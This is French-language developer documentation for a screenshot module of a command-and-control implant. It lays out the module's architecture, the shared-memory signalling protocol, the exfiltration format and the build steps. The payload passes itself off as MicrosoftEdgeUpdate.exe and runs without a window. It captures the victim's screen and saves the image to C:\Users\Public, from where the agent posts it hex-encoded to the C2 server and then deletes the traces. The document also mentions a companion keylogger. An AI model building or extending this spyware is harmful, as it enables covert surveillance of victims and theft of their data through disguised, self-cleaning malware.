# Payload Screenshot

> Fichier source : [`screenshot_payload/screenshot_shmem.c`](../screenshot_payload/screenshot_shmem.c)

---

## Description

Le payload screenshot capture **une seule fois** l'ecran de la machine cible, le sauvegarde en BMP sur le disque, signale sa disponibilite a l'agent via une zone de **memoire partagee**, puis se termine apres acquittement. L'agent envoie ensuite le fichier BMP au C2 et nettoie tous les fichiers.

---

## Architecture : mode one-shot

```
C2 envoie "Inject" + payload screenshot
         │
         ▼
Agent ecrit MicrosoftEdgeUpdate.exe
Agent lance MicrosoftEdgeUpdate.exe
         │
         ▼
┌─────────────────────────────┐
│   MicrosoftEdgeUpdate.exe   │
│   (screenshot_shmem.c)      │
│                             │
│  1. Cree shared memory      │
│  2. Capture ecran (GDI32)   │
│  3. Sauvegarde BMP          │─────► C:\Users\Public\screenshot.bmp
│  4. has_new_data = 1        │
│  5. Attend ACK (30s max)    │
└──────────────┬──────────────┘
               │ Shared Memory "Local\ScreenshotSharedMem"
               ▼
┌────────────────────────────────────────────────────────┐
│   Agent (boucle heartbeat)                             │
│                                                        │
│  read_screenshot_data()                                │
│   ├── Ouvre shared memory                              │
│   ├── has_new_data == 1 ?                              │
│   ├── Lit screenshot.bmp depuis disque                 │
│   └── has_new_data = 0  (acquittement)                 │
│                                                        │
│  send_screenshot_to_c2()                               │
│   └── POST /screenshot  (donnees en hexadecimal)       │
│                                                        │
│  Cleanup                                               │
│   ├── WaitForSingleObject(process, 3s)                 │
│   ├── TerminateProcess()                               │
│   ├── DeleteFile(MicrosoftEdgeUpdate.exe)              │
│   └── DeleteFile(screenshot.bmp)                       │
└────────────────────────────────────────────────────────┘
               │
               ▼
      POST /screenshot
               │
               ▼
┌──────────────────────────┐
│       C2 Server          │
│  Recoit BMP encode hex   │
└──────────────────────────┘
```

---

## Fonctionnement detaille

### 1. Capture d'ecran (GDI32)

```c
GetDC(NULL)                        // Contexte du bureau entier
CreateCompatibleDC()               // Contexte memoire
CreateCompatibleBitmap()           // Bitmap aux dimensions de l'ecran
BitBlt(hdcMem, ..., SRCCOPY)       // Copier les pixels du bureau
GetDIBits(..., DIB_RGB_COLORS)     // Extraire les pixels en RGB 24-bit
```

Le BMP est construit manuellement avec `BITMAPFILEHEADER` + `BITMAPINFOHEADER` + pixels.

**Ordre des lignes** : `GetDIBits` avec `biHeight > 0` retourne les lignes en ordre bas-en-haut (bottom-up), ce qui est le format standard BMP. Les lignes sont ecrites dans l'ordre naturel (0 → screenHeight-1) — l'image est donc correctement orientee.

### 2. Signalisation (shared memory)

```c
typedef struct {
    volatile LONG has_new_data;     // 1 = screenshot dispo, 0 = acquitte
    volatile LONG is_active;        // 1 = payload en cours d'execution
    volatile LONG screenshot_size;  // Taille du fichier BMP en bytes
    char screenshot_path[MAX_PATH]; // Chemin : C:\Users\Public\screenshot.bmp
} SharedScreenshotData;
```

Nom de l'objet : `"Local\ScreenshotSharedMem"`

### 3. Protocole d'acquittement

| Etape | Producteur (payload) | Consommateur (agent) |
|---|---|---|
| 1 | Capture + sauvegarde BMP | - |
| 2 | `has_new_data = 1` | - |
| 3 | Attend `has_new_data == 0` (timeout 30s) | Detecte `has_new_data == 1` |
| 4 | - | Lit le fichier BMP |
| 5 | - | `has_new_data = 0` (acquittement) |
| 6 | Recu → `is_active = 0` → exit | Envoie au C2 + cleanup |

### 4. Envoi au C2

Le fichier BMP est encode en **hexadecimal** avant envoi :

```json
{
  "agent_id": "<uuid>",
  "type": "screenshot",
  "data": "424d360080....(hex du BMP)..."
}
```

Endpoint : `POST /screenshot`

Un BMP full HD (1920x1080) pese environ **6 Mo**, soit ~12 Mo en hexadecimal.

---

## Chemins utilises

| Element | Chemin |
|---|---|
| Executable payload | `C:\Users\Public\MicrosoftEdgeUpdate.exe` |
| Fichier BMP temporaire | `C:\Users\Public\screenshot.bmp` |

Les deux fichiers sont **supprimes** par l'agent apres envoi au C2.

---

## Detection de la presence du payload

Avant chaque lancement, l'agent verifie si le payload est deja actif :

```c
HANDLE hTest = OpenFileMappingA(FILE_MAP_READ, FALSE, "Local\\ScreenshotSharedMem");
if (hTest != NULL) {
    // Payload deja actif, ne pas relancer
}
```

---

## Timeout

- Le payload attend l'acquittement de l'agent pendant **30 secondes maximum**
- Si l'agent ne lit pas dans ce delai, le payload se termine quand meme proprement

---

## Arret / Cleanup automatique

Contrairement au keylogger (mode continu), le screenshot est **one-shot** :

1. L'agent recoit le screenshot
2. L'agent acquitte (`has_new_data = 0`)
3. Le payload se termine de lui-meme
4. L'agent attend 3s puis force la terminaison si necessaire (`TerminateProcess`)
5. L'agent supprime l'exe et le BMP
6. L'agent remet `g_running_payload.is_running = 0`
7. Un nouveau `Inject` screenshot peut etre envoye par le C2

---

## Compilation

```bash
./build_and_sign.sh screenshot_payload/screenshot_shmem.c
```

Flags detectes automatiquement par le script :
- `-lgdi32 -luser32` : GDI32 pour la capture d'ecran (detecte via `BitBlt`, `GetDC`)
- `-mwindows` : pas de fenetre console (detecte via `SUBSYSTEM:windows`)

---

## Test manuel du payload

Un outil de test est fourni pour verifier la shared memory sans passer par l'agent :

```bash
# Terminal 1 : lancer le payload
MicrosoftEdgeUpdate.exe

# Terminal 2 : lancer le reader de test
./build_and_sign.sh screenshot_payload/reader_test.c
reader_test.exe
```

Le `reader_test.exe` :
1. Attend que la shared memory soit creee
2. Detecte `has_new_data == 1`
3. Verifie le fichier BMP (taille + signature `BM`)
4. Acquitte (`has_new_data = 0`)

---

## Fichiers associes

| Fichier | Role |
|---|---|
| `screenshot_payload/screenshot_shmem.c` | Source du payload screenshot |
| `screenshot_payload/reader_test.c` | Outil de test de la shared memory |
| `screenshot_payload/reader_test.exe` | Reader de test compile |
